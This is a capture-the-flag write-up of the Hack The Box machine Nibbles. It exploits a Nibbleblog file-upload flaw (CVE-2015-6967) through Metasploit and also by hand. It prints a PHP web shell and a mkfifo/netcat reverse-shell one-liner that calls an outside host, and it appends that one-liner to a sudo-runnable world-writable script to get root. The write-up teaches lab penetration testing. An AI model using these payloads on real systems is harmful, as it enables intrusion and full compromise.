---
title: HTB: Nibbles
url: https://0xdf.gitlab.io/2018/06/30/htb-nibbles.html
date: 2018-06-30T15:17:57+00:00
difficulty: Easy [20]
os: Linux
tags: hackthebox, htb-nibbles, ctf, meterpreter, sudo, cve-2015-6967, oscp-like-v2, oscp-like-v1
---

Nibbles is one of the easier boxes on HTB. It hosts a vulnerable instance of [nibbleblog](http://www.nibbleblog.com/). There’s a Metasploit exploit for it, but it’s also easy to do without MSF, so I’ll show both. The privesc involves abusing `sudo` on a file that is world-writable.

## Box Info

| Name | [Nibbles](https://hackthebox.com/machines/nibbles)  [Nibbles](https://hackthebox.com/machines/nibbles) [Play on HackTheBox](https://hackthebox.com/machines/nibbles) |
| --- | --- |
| Release Date | 13 Jan 2018 |
| Retire Date | 04 May 2024 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Nibbles |
| Radar Graph | Radar chart for Nibbles |
| First Blood User | 02:20:53[m0noc m0noc](https://app.hackthebox.com/users/4365) |
| First Blood Root | 02:24:34[m0noc m0noc](https://app.hackthebox.com/users/4365) |
| Creator | [mrb3n mrb3n](https://app.hackthebox.com/users/2984) |

## nmap

An initial nmap scan showed only web/http (80) and ssh (22):

```

root@kali# nmap -sV -sC -oA nmap/initial 10.10.10.75

Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-08 19:10 EST
Nmap scan report for 10.10.10.75
Host is up (0.099s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.41 seconds

```

## Site - port 80 recon

### web root

The root page simply returns a “hello world” message:
![1529803978686](https://0xdfimages.gitlab.io/img/1529803978686.png)

However, looking at the source provides a hint as to where to go next:

```

<b>Hello world!</b>

<!-- /nibbleblog/ directory. Nothing interesting here! -->

```

### /nibbleblog

At `/nibbleblog/`, there’s a empty instance of a blog, “Powered by Nibbleblog”:
![main](https://0xdfimages.gitlab.io/img/nibbles-main.png)

#### gobuster

As there’s not much obvious to do with this blog, let’s start a `gobuster` to see what pages are there. Having noticed that the links on the page were to php files, we’ll search for php and txt extensions:

```

root@kali# gobuster -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x php,txt

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.75/nibbleblog/
[+] Threads      : 20
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 301,302,307,200,204
[+] Extensions   : .php,.txt
=====================================================
/index.php (Status: 200)
/sitemap.php (Status: 200)
/content (Status: 301)
/themes (Status: 301)
/feed.php (Status: 200)
/admin (Status: 301)
/admin.php (Status: 200)
/plugins (Status: 301)
/install.php (Status: 200)
/update.php (Status: 200)
/README (Status: 200)
/languages (Status: 301)
/LICENSE.txt (Status: 200)
/COPYRIGHT.txt (Status: 200)

```

#### Identifying a username

In exploring the resulting paths, `/nibbleblog/content` is interesting, and has dir lists enabled. Digging deeper, there’s a page at `/nibbleblog/content/private/users.xml` which reveals a user, admin, as well as the IPs that have tried to log in as it:

```

<users>
  <user username="admin">
    <id type="integer">0</id>
    <session_fail_count type="integer">0</session_fail_count>
    <session_date type="integer">1520559147</session_date>
  </user>
  <blacklist type="string" ip="10.10.10.1">
    <date type="integer">1512964659</date>
    <fail_count type="integer">1</fail_count>
  </blacklist>
  <blacklist type="string" ip="10.10.14.80">
    <date type="integer">1520559030</date>
    <fail_count type="integer">4</fail_count>
  </blacklist>
</users>

```

#### logging into admin panel

The `gobuster` also showed a `/admin.php` path, and that presents a login page:
![1529806773508](https://0xdfimages.gitlab.io/img/1529806773508.png)

I wasn’t able to locate a password elsewhere on the blog, and nibbleblog doesn’t have a default password. Luckily, the guess of nibbles worked, and we are in:
![admin](https://0xdfimages.gitlab.io/img/nibbles-admin.png)

## Remote Code Execution (via file upload):

From the `gobuster` results, there’s a `README` file, and that gives us a version:

```

====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
...

```

This version of nibbleblog is vulnerable to CVE-2015-6967, which is an authenticated arbitrary file upload, which can lead to code execution. There’s both a metasploit modules, and it’s pretty straightforwards to do manually.

### Metasploit –> Meterpreter

We’ll use `multi/http/nibbleblog_file_upload` to get a shell on the box.

```

msf exploit(multi/http/nibbleblog_file_upload) > info
       Name: Nibbleblog File Upload Vulnerability
     Module: exploit/multi/http/nibbleblog_file_upload
   Platform: PHP
       Arch: php
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2015-09-01

Provided by:
  Unknown
  Roberto Soares Espreto <robertoespreto@gmail.com>

Available targets:
  Id  Name
  --  ----
  0   Nibbleblog 4.0.3

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  PASSWORD   nibbles          yes       The password to authenticate with
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOST      10.10.10.75      yes       The target address
  RPORT      80               yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /nibbleblog/     yes       The base path to the web application
  USERNAME   admin            yes       The username to authenticate with
  VHOST                       no        HTTP server virtual host

Payload information:

Description:
  Nibbleblog contains a flaw that allows an authenticated remote
  attacker to execute arbitrary PHP code. This module was tested on
  version 4.0.3.

References:
  http://blog.curesec.com/article/blog/NibbleBlog-403-Code-Execution-47.html

msf exploit(multi/http/nibbleblog_file_upload) > run
[*] Started reverse TCP handler on 10.10.14.157:4444
[*] Sending stage (37543 bytes) to 10.10.10.75
[*] Meterpreter session 2 opened (10.10.14.157:4444 -> 10.10.10.75:56052) at 2018-03-08 20:51:40 -0500
[+] Deleted image.php
meterpreter > shell
Process 3816 created.
Channel 0 created.
id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)

```

### user.txt

From there, we’ll upgrade our shell, and then get user.txt:

```

python -c 'import pty;pty.spawn("/bin/bash")'
/bin/sh: 1: python: not found
python3 -c 'import pty;pty.spawn("/bin/bash")'
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd /home
nibbler@Nibbles:/home$ ls
nibbler

nibbler@Nibbles:/home$ cd nibbler

nibbler@Nibbles:/home/nibbler$ ls
personal  personal.zip  user.txt

nibbler@Nibbles:/home/nibbler$ wc -c user.txt
33 user.txt

nibbler@Nibbles:/home/nibbler$ cat user.txt
b02ff32b...

```

### Without Metasploit

[This blog](https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html) provides a good write up of CVE-2015-6967, and how to exploit it.
1. Obtain admin credentials - we already have this.
2. Activate the “My image” plugin.
   If we click on “Plugings” on the menu on the left side of the admin page, it takes us to a list of installed plugins:
   ![1529838022141](https://0xdfimages.gitlab.io/img/1529838022141.png)
   So we can click “configure” under the vulnerable plugin, “My image”. We’re given an upload form:
   ![1529838333058](https://0xdfimages.gitlab.io/img/1529838333058.png)
3. Use the form to upload cmd.php.

   ```

   root@kali# cat cmd.php
   <?php system($_REQUEST['cmd']); ?>

   ```
4. Visit `http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd=[command]`
   ![1529838501643](https://0xdfimages.gitlab.io/img/1529838501643.png)

For whatever reason, I’m finding that my session with this site isn’t lasting long (probably other users logging in and stepping on my shell, since they are all named image.php). So let’s get a real shell. We’ll change out php to this:

```

root@kali# cat callback.php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.154 8082 >/tmp/f"); ?>

```

Then repeat the steps above, and on visiting `image.php`:

```

root@kali# nc -lnvp 8082
listening on [any] 8082 ...
connect to [10.10.15.154] from (UNKNOWN) [10.10.10.75] 55268
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)

```

## Privesc

Either through running `LinEnum.sh` or just by checking `sudo -l`, we’ll see the following:

```

nibbler@Nibbles:/$ sudo -l
sudo: unable to resolve host Nibbles: Connection timed out
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

```

So with no password, we can run `monitor.sh`.

`monitor.sh` is a publicly available script:

```

nibbler@Nibbles:/home/nibbler/personal/stuff$ head monitor.sh
                  ####################################################################################################
                  #                                        Tecmint_monitor.sh                                        #
                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
                  # If any bug, report us in the link below                                                          #
                  # Free to use/edit/distribute the code below by                                                    #
                  # giving proper credit to Tecmint.com and Author                                                   #
                  #                                                                                                  #
                  ####################################################################################################
#! /bin/bash
# unset any variable which system may be using

```

But it doesn’t really matter, since the script is world-writable:

```

nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -l
total 4
-rwxrwxrwx 1 nibbler nibbler 80 Jun 24 07:27 monitor.sh

```

In fact, if you are on the free, you’re very likely to find this file completely overwritten with other people’s privesc.

Rather than bluntly overwriting the script, we’ll append our shell to the end:

```

nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.154 8083 > /tmp/f" >> monitor.sh
< /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.154 8083 > /tmp/f" >> monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh

```

```

root@kali# nc -lnvp 8083
listening on [any] 8083 ...
connect to [10.10.15.154] from (UNKNOWN) [10.10.10.75] 52184
# id
uid=0(root) gid=0(root) groups=0(root)

```

### root.txt

Now it’s easy to grab the root flag:

```

# cd /root
# wc -c root.txt
33 root.txt
# cat root.txt
b6d745c0...

```